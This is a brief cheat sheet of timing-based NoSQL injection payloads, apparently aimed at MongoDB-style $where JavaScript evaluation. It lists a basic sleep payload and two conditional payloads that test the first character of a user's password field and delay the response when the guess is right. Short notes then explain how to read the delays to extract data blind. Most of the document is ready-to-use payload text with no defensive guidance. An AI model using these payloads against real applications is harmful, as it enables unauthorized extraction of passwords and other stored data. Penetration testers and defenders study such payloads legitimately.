# Timing-Based NoSQL Injection Payloads

## Basic Delay

```json
{
  "$where":"sleep(5000)"
}
```

---

## Conditional Delay

```text
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

---

## Busy-Wait Delay

```text
admin'+function(x){var waitTill=new Date(new Date().getTime()+5000);while((x.password[0]==="a")&&waitTill>new Date()){};}(this)+'
```

---

# Purpose

These payloads introduce a measurable delay when the injected condition evaluates to true.

---

# Expected Result

- Establish a normal response-time baseline.
- Submit the timing payload.
- Observe whether the response is delayed.

A consistent delay suggests that the injected JavaScript is being executed.

---

# Key Takeaways

- Timing-based techniques are useful when the application provides no visible response differences.
- Conditional delays support blind data extraction.